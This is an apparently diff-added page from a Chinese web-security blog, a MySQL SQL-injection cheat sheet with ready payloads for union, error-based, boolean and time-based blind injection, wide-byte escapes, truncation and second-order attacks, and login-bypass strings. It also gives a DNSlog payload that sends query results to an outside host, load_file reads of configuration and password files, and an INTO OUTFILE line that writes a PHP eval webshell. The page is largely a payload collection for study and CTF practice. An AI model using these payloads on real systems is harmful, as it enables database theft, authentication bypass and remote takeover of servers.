+<p>in（<code>select '123' in ('12') =&gt; false</code>）</p>
+</li>
+<li>
+<p>between (<code>select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';</code>)</p>
+</li>
+<li>
+<p>regexp / rlike(正则匹配<code>select '123455' regexp '^12' =&gt; true</code>)</p>
+</li>
+</ul>
+<p>算术运算符</p>
+<ul>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+<li>-</li>
+<li>
+<ul>
+<li></li>
+</ul>
+</li>
+<li>/</li>
+</ul>
+<p>逻辑运算符</p>
+<ul>
+<li>not / ！</li>
+<li>and / &amp;&amp;</li>
+<li>or / ||</li>
+<li>xor / ^</li>
+</ul>
+<p>位运算符</p>
+<ul>
+<li>&amp; 按位与</li>
+<li>| 按位或</li>
+<li>^ 按位异或</li>
+<li>! 取反</li>
+<li>&lt;&lt; 左移</li>
+<li>&gt;&gt;右移</li>
+</ul>
+<h4 id="绕过函数">绕过函数</h4>
+<ul>
+<li>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</li>
+<li>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</li>
+</ul>
+<h4 id="延时函数">延时函数</h4>
+<ul>
+<li>sleep()</li>
+<li>benchmark(1000000,sha(1))</li>
+</ul>
+<h4 id="编码函数">编码函数</h4>
+<ul>
+<li>hex()</li>
+<li>ascii()</li>
+</ul>
+<h4 id="文件函数">文件函数</h4>
+<ul>
+<li>load_file() //读文件路径可以用0x，char转换的字符</li>
+<li>outfile <code>select * into outfile '/tmp/test.txt'</code></li>
+<li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</li>
+</ul>
+<h3 id="构造语句">构造语句</h3>
+<h4 id="条件语句">条件语句</h4>
+<ul>
+<li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li>
+<li><code>select case when (条件) then 代码1 else 代码 2 end</code></li>
+</ul>
+<h4 id="information-schema-结构">information_schema 结构</h4>
+<ul>
+<li>information_schema.tables:<br>
+查询表名:table_name 对应的数据库名: table_schema</li>
+<li>information_schema.columns:<br>
+查询列名:column_name 对应的表名:table_schemam</li>
+</ul>
+<h4 id="Mysql注入语句一般形式">Mysql注入语句一般形式</h4>
+<ul>
+<li>联合 <code>构造联合语句 + 查询结果</code></li>
+<li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li>
+<li>报错 <code>构造报错语句 + 查询结果</code></li>
+</ul>
+<h4 id="Mysql空白字符">Mysql空白字符</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure>
+<p>函数名和括号直接可以插入特殊字符 ex</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure>
+<h3 id="判断注入是否存在">判断注入是否存在</h3>
+<p>数值型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+1</span><br><span class="line">?id&#x3D;-1 or 1&#x3D;1</span><br><span class="line">?id&#x3D;-1 or 10-2&#x3D;8</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>字符型注入<br>
+参数被引号包围，所以需要闭合引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+<p>闭合后构造语句再注释后面</p>
+<h3 id="四大基本注入类型">四大基本注入类型</h3>
+<h4 id="UNION注入">UNION注入</h4>
+<p>最简单的注入</p>
+<p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p>
+<p><strong>ORDER BY</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure>
+<p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数</p>
+<p><strong>UNION SELECT</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure>
+<p><strong>数据库查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure>
+<p><strong>表查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff</span><br></pre></td></tr></table></figure>
+<p><strong>字段查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff</span><br></pre></td></tr></table></figure>
+<p><strong>数据获取</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure>
+<h4 id="报错注入">报错注入</h4>
+<p><strong>常见报错payload</strong></p>
+<ul>
+<li>
+<p>floor()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>updatexml() <a target="_blank" rel="noopener" href="//5.1.5">//5.1.5</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>extractvalue() <a target="_blank" rel="noopener" href="//5.1.5">//5.1.5</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>exp() <a target="_blank" rel="noopener" href="//5.5.xn--5-bs6a4sito1pkfo13kbusp3f">//5.5.5版本之后可以使用</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>name_const //支持老版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="布尔盲注">布尔盲注</h4>
+<p><strong>常用payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure>
+<h4 id="时间盲注">时间盲注</h4>
+<p><strong>常用payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
+<p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替</p>
+<p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p>
+<p>除开最常见的sleep延时，还有以下姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure>
+<p><strong>比赛姿势</strong></p>
+<ul>
+<li>
+<p>笛卡尔积</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p>
+<ul>
+<li>GET_LOCK</li>
+</ul>
+<p>是pwnhub的一道题目<br>
+利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>
+太少用到不赘述了<br>
+<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35245598">https://zhuanlan.zhihu.com/p/35245598</a></p>
+<ul>
+<li>RLIKE</li>
+</ul>
+<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="Mysql注入杂技">Mysql注入杂技</h3>
+<h4 id="insert-update-delete注入">insert/update/delete注入</h4>
+<p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>
+本质是在闭合语句后通过子查询进行注入，通常为盲注</p>
+<h5 id="update">update</h5>
+<p>一段我在实战中遇到的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);</span><br><span class="line">if(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;&#123;\&quot;success\&quot;:true,\&quot;msg\&quot;:\&quot;回复成功!\&quot;&#125;&quot;;	</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&#123;\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;回复失败!\&quot;&#125;&quot;;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>set 和 where 处都可以注入<br>
+建议在where处进行注入</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(1) %23</span><br></pre></td></tr></table></figure>
+<p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p>
+<p>但是字符型又有另一个坑点<br>
+字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>
+所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code></p>
+<p>但是或逻辑运算中同样存在问题</p>
+<p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>
+测试只有字符为0时才会执行or后的sleep</p>
+<p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p>
+<p>异或的坑点和或相似<br>
+当字符不为数字时不会执行，具体深层原因先留坑吧</p>
+<p>这里还有坑…</p>
+<p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>
+实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>
+要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值</p>
+<p>测试mysql版本5.3.72</p>
+<h5 id="insert-delete">insert/delete</h5>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;);</span><br></pre></td></tr></table></figure>
+<p>类似update，不赘述了</p>
+<h4 id="Order-by注入">Order by注入</h4>
+<p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>
+ctf中的进阶形式为order by 一个特定字段<br>
+比如hctf中的一道题目</p>
+<h4 id="宽字节注入">宽字节注入</h4>
+<p><strong>原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">....</span><br><span class="line">$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure>
+<p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。</p>
+<p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。</p>
+<p>常见payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%df&#39; #</span><br></pre></td></tr></table></figure>
+<h4 id="Mysql约束攻击">Mysql约束攻击</h4>
+<p><strong>原理</strong><br>
+主要两个点</p>
+<ul>
+<li>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</li>
+<li>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</li>
+</ul>
+<p>利用方式即注册一’admin     a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin   ’用户，而在select的过程中’admin ‘是与’admin’相等的</p>
+<p>所以就可以用’admin ‘的密码登陆’admin’</p>
+<h4 id="二次注入">二次注入</h4>
+<p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p>
+<p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<p>这个。。只能具体情况分析了，不太好写</p>
+<p>比如sql lab-24</p>
+<h4 id="Mysql带外注入">Mysql带外注入</h4>
+<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>
+它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p>
+<h5 id="DNSlog">DNSlog</h5>
+<p>只能用于windows环境</p>
+<p>select拼接一个UNC路径导致请求发起<br>
+UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>
+其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<p>\<a target="_blank" rel="noopener" href="http://sss.xxx">sss.xxx</a>\test\</p>
+<p>常见payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;)</span><br></pre></td></tr></table></figure>
+<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p>
+<p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能</p>
+<p>利用方法</p>
+<p>首先查看变量确定权限<br>
+show variables like ‘%secure%’</p>
+<ul>
+<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
+<li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
+<li>当secure_file_priv为null，load_file就不能加载文件。</li>
+</ul>
+<p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>
+可以通过mysql的配置文件my.ini添加行进行配置</p>
+<p>最好进行加密处理，防止特殊字符导致传输失败<br>
+payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure>
+<h4 id="文件读写">文件读写</h4>
+<p>查询用户读写权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>load_file()</li>
+</ul>
+<p>需要有读取文件的权限<br>
+需要知道文件的绝对物理路径<br>
+要读取的文件大小必须小于 max_allowed_packet</p>
+<p>一般没啥问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@max_allowed_packet;</span><br></pre></td></tr></table></figure>
+<p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。</p>
+<p>常见paylaod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure>
+<p>后面的路径可以是单引号、0x、char转换的字符<br>
+路径中的斜杠是/而不是\</p>
+<p>使用编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure>
+<ul>
+<li>out_file()</li>
+</ul>
+<p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>
+经典一句话payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
+<p>当然也可以从表中选数据写</p>
+<h4 id="万能密码">万能密码</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’&#x2F;*</span><br><span class="line">or ‘&#x3D;’ or</span><br><span class="line">‘ or 1&#x3D;1—</span><br><span class="line">‘ or 1&#x3D;1#</span><br><span class="line">‘ or 1&#x3D;1&#x2F;*</span><br><span class="line">‘) or ‘1’&#x3D;’1—</span><br><span class="line">‘) or (‘1’&#x3D;’1—</span><br></pre></td></tr></table></figure>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-12-10</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>-><a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">#SQL注入</a> <a class="tag-none-link" href="/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">#Web安全学习</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
